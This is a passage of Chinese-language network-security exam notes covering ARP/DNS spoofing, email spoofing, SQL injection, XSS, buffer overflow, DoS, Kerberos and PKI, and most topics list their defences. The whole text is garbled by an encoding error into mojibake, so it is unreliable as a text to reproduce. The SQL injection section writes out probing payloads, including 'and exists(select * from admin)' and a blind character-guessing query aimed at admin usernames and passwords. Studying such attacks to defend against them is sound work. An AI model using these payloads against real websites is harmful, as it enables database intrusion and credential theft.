‡ä¸»æœºå‘é€è™šå‡çš„ARPå›åº”åŒ…(å°†MACåœ°å€è®¾ä¸ºè‡ªå·±çš„MACåœ°å€)ï¼Œæˆä¸ºâ€ä¸­é—´äººâ€,ä½¿æ‰€æœ‰çš„æ•°æ®åŒ…éƒ½ä¼šæµç»æ”»å‡»è€…çš„ç½‘å¡) ARPæ¬ºéª—æ£€æµ‹ç½‘ç»œé¢‘ç¹æ‰çº¿ã€å˜å¡ã€arp -aæŸ¥çœ‹æ˜ å°„è¡¨å‘ç°ç½‘å…³MACåœ°å€ä¸çœŸå®ä¸ç¬¦ã€ä½¿ç”¨å—…æ¢å·¥å…·å‘ç°ç½‘ç»œä¸­æœ‰å¤§é‡çš„ARPå“åº”åŒ…(Ettercap)â€¦ ARPæ¬ºéª—é˜²å¾¡1.é™æ€ç»‘å®ša.MACåœ°å€ç»‘å®šb.ä½¿ç”¨é™æ€ARPç¼“å­˜2.ARPé˜²ç«å¢™3.ä½¿ç”¨ARPæœåŠ¡å™¨(ç¡®ä¿æœåŠ¡å™¨ä¸è¢«æ¬ºéª—)4.åŠæ—¶éš”ç¦»è¢«æ¬ºéª—çš„ä¸»æœº 19.DNSæ¬ºéª—(æŒæ¡)åˆç§°DNSåŸŸåé‡å®šå‘æˆ–åŸŸååŠ«æŒï¼Œæ˜¯é€šè¿‡æ‹¦æˆªåŸŸåè§£æè¯·æ±‚æˆ–ç¯¡æ”¹åŸŸåæœåŠ¡å™¨ä¸Šçš„æ•°æ®ï¼Œä½¿å¾—ç”¨æˆ·åœ¨è®¿é—®ç›¸å…³åŸŸåæ—¶è¿”å›è™šå‡IPåœ°å€æˆ–ä½¿ç”¨æˆ·çš„è¯·æ±‚å¤±è´¥çš„æ”»å‡»æ–¹å¼ã€‚ DNSæ¬ºéª—ä¸€èˆ¬è¿‡ç¨‹(å¦‚æœèƒ½è·å¾—DNSæœåŠ¡å™¨çš„æ§åˆ¶æƒå†å¥½ä¸è¿‡ï¼Œç›´æ¥ä¼ªé€ ä¸€æ¡è®°å½•å°±å¥½ï¼Œä½†æ˜¯å¾ˆéš¾ã€‚å°è¯•æ§åˆ¶DNSæœåŠ¡å™¨æ‰€åœ¨ç½‘ç»œä¸‹çš„ä¸€å°ä¸»æœºï¼Œç›‘å¬ç½‘ç»œé€šä¿¡ï¼Œåˆ©ç”¨ARPã€IPæ¬ºéª—å–å¾—ä¿¡ä»»åï¼Œæ”»å‡»è€…å—…æ¢ç›®æ ‡ä¸»æœºå‘é€çš„DNSè¯·æ±‚æ•°æ®åŒ…ï¼Œåˆ†æIDå’Œç«¯å£å·ï¼Œæ„é€ DNSåº”ç­”åŒ…ï¼Œè‹¥å‘é€çš„åº”ç­”åŒ…IDå’Œç«¯å£æ­£ç¡®ï¼Œåˆ™æŠŠè¿”å›çš„æ•°æ®åŒ…ä¸­çš„åŸŸåå’ŒIPåœ°å€å­˜è¿›DNSç¼“å­˜è¡¨ï¼ŒçœŸå®çš„DNSåº”ç­”åŒ…è¢«ä¸¢å¼ƒ) DNSæ¬ºéª—é˜²å¾¡1.DNSæœåŠ¡å™¨è½¯ä»¶å®‰è£…è¡¥ä¸2.é™åˆ¶DNSåŠ¨æ€æ›´æ–°3.é™åˆ¶åŒºåŸŸä¼ é€4.å…³é—­DNSæœåŠ¡å™¨çš„é€’å½’æŸ¥è¯¢ 20.ç”µå­é‚®ä»¶æ¬ºéª—ä¸é‚®ä»¶å®‰å…¨ï¼ˆPGPï¼‰æ”»å‡»ä¸»è¦è¡¨ç°1.ç”µå­é‚®ä»¶ç‚¸å¼¹ã€â€æ»šé›ªçƒâ€ã€åƒåœ¾é‚®ä»¶2.è‡ªç§°ç®¡ç†å‘˜ï¼Œå‡å†’ï¼Œé™„ä»¶æœ¨é©¬ åŸºæœ¬æ–¹æ³•1.ç›¸ä¼¼çš„ç”µå­é‚®ä»¶åœ°å€2.å†’å……å›å¤åœ°å€3.åˆ©ç”¨é™„ä»¶æ¬ºéª—4.è¿œç¨‹ç™»å½•åˆ°SMTPç«¯å£25å‘é€é‚®ä»¶ é˜²å¾¡1.æ ‘ç«‹é£é™©æ„è¯†2.å¯¹é‚®ä»¶åŠ å¯†ç­¾å Webæ”»å‡»ä¸é˜²å¾¡21.SQLæ³¨å…¥åŸç†ã€åˆ†ç±»ã€æ”»å‡»è¿‡ç¨‹ï¼ˆç¨‹åºåˆ†æèƒ½åŠ›ï¼‰*(æŒæ¡)åŸç†åˆ©ç”¨Webåº”ç”¨å¯¹åå°æ•°æ®åº“æŸ¥è¯¢è¯­å¥å¤„ç†å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…æä¾›æ„é€ çš„æ•°æ®åº“æŸ¥è¯¢ä»£ç ï¼Œæ ¹æ®è¿”å›ç»“æœå¾—åˆ°ç›®çš„æ•°æ®ã€‚å—å½±å“ç³»ç»Ÿ ï¼šå¯¹è¾“å…¥å‚æ•°ä¸è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤å°±æ˜¯é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•é€’äº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚ åˆ†ç±»1.æ™®é€šæ³¨å…¥æ ¹æ®æ•°æ®åº“æç¤ºçš„æœ‰ä»·å€¼çš„ä¿¡æ¯è¿›è¡Œæ³¨å…¥ 2.ç›²æ³¨æœ‰ç»éªŒçš„ç®¡ç†å‘˜åœ¨ç»™å‡ºé”™è¯¯æç¤ºé¡µé¢æ—¶ï¼Œä¸æä¾›è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼Œæ”»å‡»è€…è¦å¯¹è¡¨ä¸­çš„æ¯ä¸ªå­—æ®µé€å­—çŒœè§£ æ³¨å…¥ç‚¹ç±»å‹1.æ•°å­—å‹12...index.php?id=1select * from è¡¨å where id=1ï¼› 2.å­—ç¬¦å‹12...index.php?name=adminselect * from è¡¨å where name='admin'; SQLiæ–¹æ³•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼š 12and 1=1 #è¿”å›æ­£å¸¸é¡µé¢and 1=2 #è¿”å›é”™è¯¯é¡µé¢æˆ–ç©ºé¡µ å¸ƒå°”å‹æ³¨å…¥åŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥å¯è”åˆæŸ¥è¯¢æ³¨å…¥å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ SQLiè¿‡ç¨‹å®¢æˆ·ç«¯(å‚æ•°å€¼ç­‰æ•°æ®è¢«ä¿®æ”¹)â€“&gt;æœåŠ¡ç«¯(æœªç»æ£€æŸ¥å’Œè¿‡æ»¤ï¼Œå°†è¢«ä¿®æ”¹çš„æ•°æ®æ³¨å…¥åˆ°SQLè¯­å¥ä¸­ï¼ŒSQLè¯­å¥åŠŸèƒ½è¢«ä¿®æ”¹)â€“&gt;æ•°æ®åº“å¼•æ“(æ‰§è¡Œè¢«ä¿®æ”¹åçš„SQLå‘½ä»¤)â€“&gt;æœåŠ¡ç«¯(å°†æ³¨å…¥çš„ç»“æœè¿”å›å®¢æˆ·ç«¯)â€“&gt;å®¢æˆ·ç«¯(æ ¹æ®ä¸Šä¸€æ¬¡æ³¨å…¥è·å¾—çš„æ•æ„Ÿä¿¡æ¯ï¼Œæ„é€ æ³¨å…¥è¯­å¥è¿›ä¸€æ­¥æ³¨å…¥)1.å¯»æ‰¾æ³¨å…¥ç‚¹(å­˜åœ¨SQLiæ¼æ´çš„è¿æ¥)2.æµ‹è¯•è¯¥ç½‘ç«™æ˜¯å¦å­˜åœ¨SQLiæ¼æ´3.çŒœè§£æ•°æ®åº“å-&gt;è¡¨å-&gt;å­—æ®µå-&gt;è¡¨çš„å†…å®¹(*é‡ç‚¹æŸ¥è¯¢ä¸ç”¨æˆ·ç›¸å…³çš„è¡¨ï¼Œè·å–ç”¨æˆ·å+å¯†ç (ç®¡ç†å‘˜ä¼˜å…ˆ))4.åç»­æ”»å‡» æ³¨å…¥å®ä¾‹1.å½¢å¦‚ï¼š 12...index.php?id=1select * from è¡¨å where id=1ï¼› 2.æµ‹è¯•æœ‰æ— æ¼æ´?id=1â€™ æŠ¥é”™ï¼Œè‹¥æœ‰è¿”å›ä¿¡æ¯ï¼Œå¯èƒ½å¯ä»¥ç¡®å®šåå°æ•°æ®åº“ç‰ˆæœ¬å‹å·åœ¨æœ«å°¾åŠ and 1=1 \\and 1=23.çŒœè§£è¡¨åæœ«å°¾åŠ and exists(select * from admin)è‹¥è¿”å›æ­£å¸¸é¡µé¢ï¼Œåˆ™å­˜åœ¨adminè¡¨4.çŒœè§£å­—æ®µååœ¨æœ«å°¾åŠ and exists(select username from admin)è‹¥è¿”å›æ­£å¸¸é¡µé¢ï¼Œåˆ™å­˜åœ¨usernameå­—æ®µåœ¨æœ«å°¾åŠ and exists(select password from admin)è‹¥è¿”å›æ­£å¸¸é¡µé¢ï¼Œåˆ™å­˜åœ¨passwordå­—æ®µ5.çŒœè§£ç”¨æˆ·å(æŠ˜åŠæŸ¥æ‰¾)and 1=(select id from (select * from admin where id=1)where asc(mid(username,1,1))&lt;100) å·¥å…·SQLmapç­‰ SQLié˜²å¾¡(éœ€è¦æŒæ¡ç®€å•çš„ä»£ç ä¿®æ”¹æ–¹å¼ä»¥æŠµå¾¡SQLiæ”»å‡»)1.ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œç»‘å®šå˜é‡2.å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®å’Œå‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤(,â€™â€™;ç­‰)3.æ‘’å¼ƒåŠ¨æ€SQLè¯­å¥ï¼Œæ”¹ç”¨å­˜å‚¨è¿‡ç¨‹æ¥è®¿é—®å’Œæ“ä½œæ•°æ®4.ä½¿ç”¨å®‰å…¨å‡½æ•°5æœ€å°æƒé™åŸåˆ™ï¼ŒåŒºåˆ†æ™®é€šç”¨æˆ·ä¸ç®¡ç†å‘˜æƒé™é¿å…Webåº”ç”¨ç›´æ¥ä½¿ç”¨rootç­‰é«˜æƒé™ç”¨æˆ·ç›´æ¥è¿æ¥DB 22.XSSåŸç†ã€åˆ†ç±»ã€æ”»å‡»è¿‡ç¨‹ï¼ˆç¨‹åºåˆ†æèƒ½åŠ›ï¼‰*(æŒæ¡)é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Javaã€ VBScriptã€ActiveXã€ Flash æˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°åŒ…æ‹¬ä½†ä¸é™äºæ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚ æ”»å‡»æ¡ä»¶WebæœåŠ¡å™¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œæœ‰æ•ˆéªŒè¯æˆ–éªŒè¯å¼ºåº¦ä¸å¤Ÿï¼Œè€Œåˆè½»æ˜“å°†ä»–ä»¬è¿”å›ç»™å®¢æˆ·ç«¯ï¼›ä¸€èˆ¬éœ€è¦ï¼š1.å­˜åœ¨è·¨ç«™è„šæœ¬æ¼æ´çš„Webåº”ç”¨2.ç”¨æˆ·ç‚¹å‡»æˆ–æµè§ˆæŸä¸ªé¡µé¢ åˆ†ç±»1.åå°„å‹ä¹Ÿå«éæŒä¹…å‹XSSï¼Œæ˜¯æŒ‡å‘ç”Ÿè¯·æ±‚æ—¶ï¼ŒXSSä»£ç å‡ºç°åœ¨è¯·æ±‚URLä¸­ï¼Œä½œä¸ºå‚æ•°æäº¤åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è§£æå¹¶å“åº”ã€‚å“åº”ç»“æœä¸­åŒ…å«XSSä»£ç ï¼Œæœ€åæµè§ˆå™¨è§£æå¹¶æ‰§è¡Œã€‚ä»æ¦‚å¿µä¸Šå¯ä»¥çœ‹å‡ºï¼Œåå°„å‹XSSä»£ç æ˜¯é¦–å…ˆå‡ºç°åœ¨URLä¸­çš„ï¼Œç„¶åéœ€è¦æœåŠ¡ç«¯è§£æï¼Œæœ€åéœ€è¦æµè§ˆå™¨è§£æä¹‹åXSSä»£ç æ‰èƒ½å¤Ÿæ”»å‡»ã€‚ï¼ˆç®€å•åœ°å°†ç”¨æˆ·è¾“å…¥æ•°æ®è¿”å›ç»™æµè§ˆå™¨ï¼Œé»‘å®¢éœ€è¦è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼‰ 2.å­˜å‚¨å¼æ°¸ä¹…å­˜å‚¨åœ¨æœåŠ¡å™¨æ•°æ®åº“æˆ–è€…æ–‡ä»¶ä¸­ 3.DOMå‹ä¸å‰ä¸¤ç§åŒºåˆ«ï¼šä¸éœ€è¦æœåŠ¡å™¨è§£æå“åº”ï¼Œè€Œæ˜¯æµè§ˆå™¨çš„DOMè§£æå™¨è§¦å‘ æ”»å‡»è¿‡ç¨‹å‚è€ƒï¼š https://www.cnblogs.com/mao2080/p/9460397.html xssé˜²å¾¡(éœ€è¦æŒæ¡ç®€å•çš„ä»£ç ä¿®æ”¹æ–¹å¼ä»¥æŠµå¾¡XSSæ”»å‡»)1.è¾“å…¥å‚æ•°å­—ç¬¦è¿‡æ»¤2.è¾“å‡ºå‚æ•°è¿›è¡Œè½¬ç 3.é™åˆ¶è¾“å…¥å‚æ•°é•¿åº¦4.è®¾ç½®cookie httponlyä¸ºtrue 1ï¼‰ æ–¹æ³•ä¸€ï¼šç»™Cookieæ·»åŠ HttpOnlyå±æ€§, è¿™ç§å±æ€§è®¾ç½®å, åªèƒ½åœ¨httpè¯·æ±‚ä¸­ä¼ é€’, åœ¨è„šæœ¬ä¸­, document.cookieæ— æ³•è·å–åˆ°è¯¥Cookieå€¼. å¯¹XSSçš„æ”»å‡», æœ‰ä¸€å®šçš„é˜²å¾¡å€¼. ä½†æ˜¯å¯¹ç½‘ç»œæ‹¦æˆª, è¿˜æ˜¯æ³„éœ²äº†.2ï¼‰æ–¹æ³•äºŒï¼šåœ¨cookieä¸­æ·»åŠ æ ¡éªŒä¿¡æ¯, è¿™ä¸ªæ ¡éªŒä¿¡æ¯å’Œå½“å‰ç”¨æˆ·å¤–ç½®ç¯å¢ƒæœ‰äº›å…³ç³»,æ¯”å¦‚ip,user agentç­‰æœ‰å…³. è¿™æ ·å½“cookieè¢«äººåŠ«æŒäº†, å¹¶å†’ç”¨, ä½†æ˜¯åœ¨æœåŠ¡å™¨ç«¯æ ¡éªŒçš„æ—¶å€™, å‘ç°æ ¡éªŒå€¼å‘ç”Ÿäº†å˜åŒ–, å› æ­¤è¦æ±‚é‡æ–°ç™»å½•, è¿™æ ·ä¹Ÿæ˜¯ç§å¾ˆå¥½çš„æ€è·¯, å»è§„é¿cookieåŠ«æŒ.3ï¼‰æ–¹æ³•ä¸‰ï¼šcookieä¸­session idçš„å®šæ—¶æ›´æ¢, è®©session idæŒ‰ä¸€å®šé¢‘ç‡å˜æ¢, åŒæ—¶å¯¹ç”¨æˆ·è€Œè¨€, è¯¥æ“ä½œæ˜¯é€æ˜çš„, è¿™æ ·ä¿è¯äº†æœåŠ¡ä½“éªŒçš„ä¸€è‡´æ€§.ï¼ˆ å¯å‚è€ƒï¼šhttps://www.cnblogs.com/momjs/p/10346579.html ï¼‰ 23.å…¶ä»–Webæ”»å‡»ç±»å‹*CSRFæ”»å‡»ï¼šhttps://www.cnblogs.com/collin/articles/9637999.htmlæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼šæŒ‡ç”±äºç¨‹åºå‘˜æœªå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡å…¶æœ¬èº«æƒé™å‘æœåŠ¡å™¨ä¸Šä¸Šä¼ å¯æ‰§è¡Œçš„åŠ¨æ€è„šæœ¬æ–‡ä»¶ã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æ¥å’Œæœ‰æ•ˆçš„ï¼Œâ€œæ–‡ä»¶ä¸Šä¼ â€æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚å¦‚æœæœåŠ¡å™¨çš„å¤„ç†é€»è¾‘åšçš„ä¸å¤Ÿå®‰å…¨ï¼Œåˆ™ä¼šå¯¼è‡´ä¸¥é‡çš„åæœã€‚ å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼šhttps://www.cnblogs.com/bmjoker/p/9084864.htmlxxeæ¼æ´ ï¼šhttps://www.freebuf.com/articles/web/177979.html 24.Webæ”»å‡»çš„é˜²å¾¡*ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ä¸é˜²å¾¡(æŒæ¡)25.ç¼“å†²åŒºæº¢å‡ºåŸç†(ä»£ç åˆ†æèƒ½åŠ›)ç¼“å†²åŒºï¼šè®¡ç®—æœºåœ¨å†…å­˜ä¸­å¼€è¾Ÿçš„ä¸€æ®µè¿ç»­çš„å†…å­˜å—ï¼Œç”¨äºå­˜æ”¾ç›¸åŒç±»å‹çš„æ•°æ® åŸç†å‘å›ºå®šé•¿åº¦çš„ç¼“å†²åŒºä¸­å†™å…¥è¶…å‡ºå…¶é¢„å®šé•¿åº¦çš„å†…å®¹ï¼Œå¯¼è‡´ç¼“å†²åŒºæ•°æ®æº¢å‡ºï¼Œä»è€Œè¦†ç›–å…¶å‘¨å›´çš„å†…å­˜ç©ºé—´é»‘å®¢å€Ÿæ­¤ç²¾å¿ƒæ„é€ å¡«å……æ•°æ®ï¼Œå¯¼è‡´åŸæœ‰çš„æµç¨‹æ”¹å˜ï¼Œè½¬å»æ‰§è¡Œç‰¹æ®Šä»£ç ï¼Œä»è€Œè·å¾—æ§åˆ¶æƒ ç¼“å†²åŒºæº¢å‡ºæ”»å‡»è¿‡ç¨‹(è¦æ±‚èƒ½æ ¹æ®ä»£ç åˆ†ææº¢å‡ºåŸç†)1.åœ¨ç¨‹åºçš„åœ°å€ç©ºé—´ä¸­å®‰æ’é€‚å½“çš„ä»£ç 2.é€šè¿‡é€‚å½“çš„åˆå§‹åŒ–å¯„å­˜å™¨å’Œå­˜å‚¨å™¨ï¼Œè®©ç¨‹åºè·³è½¬åˆ°å®‰æ’å¥½çš„åœ°å€ç©ºé—´æ‰§è¡Œ 26.æ ˆæº¢å‡ºï¼ˆç¨‹åºåˆ†æèƒ½åŠ›ï¼‰*27.å…¶ä»–æº¢å‡ºçš„å·¥ä½œåŸç†æ ¼å¼åŒ–å­—ç¬¦ä¸²æº¢å‡ºæ•´æ•°æº¢å‡ºå †æº¢å‡º 28.ç¼“å†²åŒºæº¢å‡ºçš„é˜²å¾¡æªæ–½(å¯¹ç®€å•ä»£ç èƒ½å¤Ÿä¿®æ”¹ä¼˜åŒ–ï¼Œä½¿ä¹‹å…å—æº¢å‡ºæ”»å‡») ç³»ç»Ÿç®¡ç†ä¸Š1.å…³é—­ä¸éœ€è¦çš„ç‰¹æƒç¨‹åº(ç¼“å†²åŒºæº¢å‡ºåªæœ‰è·å–æ›´é«˜æƒé™æ—¶æ‰æœ‰æ„ä¹‰)2.åŠæ—¶ç»™ç¨‹åºæ¼æ´æ‰“è¡¥ä¸ è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­1.ç¼–å†™æ­£ç¡®çš„ä»£ç (å¯¹æ•°æ®é•¿åº¦å’Œæœ‰æ•ˆæ€§æ£€æŸ¥ï¼Œç¡®ä¿ç›®æ ‡ç¼“å†²åŒºä¸­æ•°æ®ä¸è¶Šç•Œå¹¶æœ‰æ•ˆ)C/C++è¯­è¨€æœ¬èº«ä¸è¿›è¡Œå¼ºç±»å‹å’Œé•¿åº¦æ£€æŸ¥2.ç¼“å†²åŒºä¸å¯æ‰§è¡Œ3.æ”¹è¿›Cè¯­è¨€å‡½æ•°åº“éšæ‚£å‡½æ•°æ›¿æ¢:å¦‚strncpy()æ›¿æ¢strcpy()ã€strncat()æ›¿æ¢strcat(),è¯¥ç±»å‡½æ•°é™å®šäº†å­—ç¬¦ä¸²é•¿åº¦4.æ•°ç»„è¾¹ç•Œæ£€æŸ¥(ä½¿è¶…é•¿ä»£ç ä¸å¯èƒ½è¢«æ¤å…¥)5.ç¨‹åºæŒ‡é’ˆå®Œæ•´æ€§æ£€æŸ¥(é˜»æ­¢ç”±äºå‡½æ•°è¿”å›åœ°å€æˆ–å‡½æ•°æŒ‡é’ˆçš„æ”¹å˜è€Œå¯¼è‡´ç¨‹åºæ‰§è¡Œæµç¨‹çš„æ”¹å˜ï¼›æ£€æµ‹æŒ‡é’ˆæ˜¯å¦è¢«æ¶æ„æ”¹åŠ¨ï¼Œè‹¥æ”¹åŠ¨åˆ™æ‹’ç»æ‰§è¡Œ) æ‹’ç»æœåŠ¡æ”»å‡»(DoSæ”»å‡»)(æŒæ¡)29.æ‹’ç»æœåŠ¡æ”»å‡»çš„æ¦‚å¿µã€åˆ†ç±»æ¦‚å¿µç ´åå‹æ”»å‡»ï¼Œä¸ä»¥è·å–ç›®æ ‡ç³»ç»Ÿè®¿é—®æƒé™ä¸ºç›®çš„ï¼›åˆ©ç”¨ä¼ è¾“åè®®å¼±ç‚¹ã€ç³»ç»Ÿæ¼æ´ã€æœåŠ¡æ¼æ´å¯¹ç›®æ ‡ç³»ç»Ÿå‘èµ·å¤§è§„æ¨¡è¿›æ”»ï¼Œç”¨è¶…å‡ºç›®æ ‡å¤„ç†èƒ½åŠ›çš„æµ·é‡æ•°æ®åŒ…æ¶ˆè€—å¯ç”¨ç³»ç»Ÿèµ„æºã€å¸¦å®½èµ„æºç­‰ï¼Œæˆ–é€ æˆç¨‹åºç¼“å†²åŒºæº¢å‡ºé”™è¯¯ï¼Œè‡´ä½¿å…¶æ— æ³•å¤„ç†åˆæ³•ç”¨æˆ·è¯·æ±‚ï¼Œæ— æ³•æä¾›æ­£å¸¸æœåŠ¡ï¼Œæœ€ç»ˆå¯¼è‡´ç½‘ç»œæœåŠ¡ç˜«ç—ªï¼Œç”šè‡³ç³»ç»Ÿæ­»æœºã€‚ åˆ†ç±»1.èµ„æºæ¶ˆè€—2.ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºç¼ºé™·(Pingè‡´æ­»ã€landæ”»å‡»ã€Smurfæ”»å‡»ã€IPåˆ†ç‰‡æ”»å‡»ã€UDPæ³›æ´ªæ”»å‡»ç­‰)3.é…ç½®ä¿®æ”¹(ä¿®æ”¹è¿è¡Œé…ç½®ï¼Œå¯¼è‡´ç½‘ç»œç³»ç»Ÿä¸èƒ½æ­£å¸¸æä¾›æœåŠ¡) 30.æ‹’ç»æœåŠ¡æ”»å‡»çš„å®ä¾‹31.DDoSçš„å·¥ä½œåŸç†å³åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼šhttps://baijiahao.baidu.com/s?id=1612405556732723729&amp;wfr=spider&amp;for=pc 32.æ‹’ç»æœåŠ¡æ”»å‡»çš„é˜²å¾¡1.è¿›è¡Œåˆç†å¸¦å®½é™åˆ¶é™åˆ¶åŸºäºåè®®çš„å¸¦å®½ï¼›å¦‚ç«¯å£25åªèƒ½ä½¿ç”¨25%çš„å¸¦å®½2.è¿è¡Œå°½å¯èƒ½å°‘çš„æœåŠ¡ï¼Œåªå…è®¸å¿…è¦çš„é€šä¿¡3.åŠæ—¶å®‰è£…ç³»ç»Ÿè¡¥ä¸4.å°é”æ¶æ„IPåœ°å€5.å¢å¼ºç³»ç»Ÿç”¨æˆ·çš„å®‰å…¨æ„è¯†ï¼Œé¿å…æˆä¸ºå‚€å„¡ä¸»æœº 6.å»ºç«‹å¥å…¨çš„DoS/DDoSæ”»å‡»çš„åº”æ€¥å“åº”æœºåˆ¶èº«ä»½è®¤è¯33.AAA1.è®¤è¯(ä½ æ˜¯è°ï¼Ÿ)2.æˆæƒ(å…è®¸ä½ å¹²ä»€ä¹ˆï¼Ÿ)3.å®¡è®¡/è®°è´¦(ä½ å¹²äº†ä»€ä¹ˆï¼Ÿ) 34.å¸¸ç”¨èº«ä»½è®¤è¯æŠ€æœ¯åŸºäºå£ä»¤çš„è®¤è¯1.åŸºäºå•é¡¹å“ˆå¸Œå‡½æ•°(ç»“åˆæŒ‘æˆ˜-å“åº”æœºåˆ¶) 2.åŠ ç›å£ä»¤3.SKEYæœºåˆ¶4.Bellovin-Merrittçš„EKEåè®®åŸºäºå¯†ç å­¦çš„è®¤è¯åŸºäºç”Ÿç‰©ç‰¹å¾çš„è®¤è¯35.Kerberosåè®®(æŒæ¡)Kerberosæ˜¯ä¸€ç§è®¡ç®—æœºç½‘ç»œæˆæƒåè®®ï¼Œç”¨æ¥åœ¨éå®‰å…¨ç½‘ç»œä¸­ï¼Œå¯¹ä¸ªäººé€šä¿¡ä»¥å®‰å…¨çš„æ‰‹æ®µè¿›è¡Œèº«ä»½è®¤è¯ã€‚ ç»„æˆ1.è®¤è¯æœåŠ¡å™¨AS2.ç¥¨æ®è®¸å¯æœåŠ¡å™¨TGS3.å®¢æˆ·ç«¯Client4.åº”ç”¨æœåŠ¡å™¨Server å‡­è¯1.ç¥¨æ®Ticket2.é‰´åˆ«ç Authenticator è¿‡ç¨‹ è®°å· å«ä¹‰ C å®¢æˆ·ç«¯ S æœåŠ¡ç«¯ ADc å®¢æˆ·çš„ç½‘ç»œåœ°å€ Lifetime ç¥¨æ®çš„ç”Ÿå­˜æœŸ TS æ—¶é—´æˆ³ Kx xçš„ç§æœ‰å¯†é’¥ Kx,y xä¸yçš„ä¼šè¯å¯†é’¥ Kx[m] ä»¥xçš„ç§æœ‰å¯†é’¥åŠ å¯†çš„m Ticketx xçš„ç¥¨æ® Authenticatorx xçš„é‰´åˆ«ç  1.Cè¯·æ±‚ç¥¨æ®è®¸å¯ç¥¨æ®2.ASå‘æ”¾ç¥¨æ®è®¸å¯ç¥¨æ®å’Œä¼šè¯å¯†é’¥3.Cè¯·æ±‚æœåŠ¡å™¨ç¥¨æ®4.TGSå‘æ”¾æœåŠ¡å™¨ç¥¨æ®å’Œä¼šè¯å¯†é’¥5.Cè¯·æ±‚æœåŠ¡6.Sæä¾›æœåŠ¡å™¨è®¤è¯ä¿¡æ¯ 36.PKIåŸç†(å…¬é’¥åŸºç¡€è®¾æ–½PKI:æ˜¯ä¸€ä¸ªåŒ…æ‹¬ç¡¬ä»¶ã€è½¯ä»¶ã€äººå‘˜ã€ç­–ç•¥å’Œè§„ç¨‹çš„é›†åˆï¼Œç”¨æ¥å®ç°åŸºäºå…¬é’¥å¯†ç ä½“åˆ¶çš„å¯†é’¥å’Œè¯ä¹¦çš„äº§ç”Ÿã€ç®¡ç†ã€å­˜å‚¨ã€åˆ†å‘å’Œæ’¤é”€ç­‰åŠŸèƒ½ã€‚PKIä½“ç³»æ˜¯è®¡ç®—æœºè½¯ç¡¬ä»¶ã€æƒå¨æœºæ„åŠåº”ç”¨ç³»ç»Ÿçš„ç»“åˆã€‚å®ƒä¸ºå®æ–½ç”µå­å•†åŠ¡ã€ç”µå­æ”¿åŠ¡ã€åŠå…¬è‡ªåŠ¨åŒ–ç­‰æä¾›äº†åŸºæœ¬çš„å®‰å…¨æœåŠ¡ï¼Œä»è€Œä½¿é‚£äº›å½¼æ­¤ä¸è®¤è¯†æˆ–è·ç¦»å¾ˆè¿œçš„ç”¨æˆ·èƒ½é€šè¿‡ä¿¡ä»»é“¾å®‰å…¨åœ°äº¤æµã€‚)å®ƒåˆ©ç”¨å…¬å…±å¯†é’¥ç®—æ³•çš„ç‰¹ç‚¹ï¼Œå»ºç«‹ä¸€å¥—è¯ä¹¦å‘æ”¾ã€ç®¡ç†å’Œä½¿ç”¨çš„ä½“ç³»ï¼Œæ¥æ”¯æŒå’Œå®Œæˆç½‘ç»œç³»ç»Ÿä¸­çš„èº«ä»½è®¤è¯ã€ä¿¡æ¯åŠ å¯†ã€ä¿è¯æ•°æ®å®Œæ•´æ€§å’ŒæŠ—æŠµèµ–æ€§ã€‚PKI 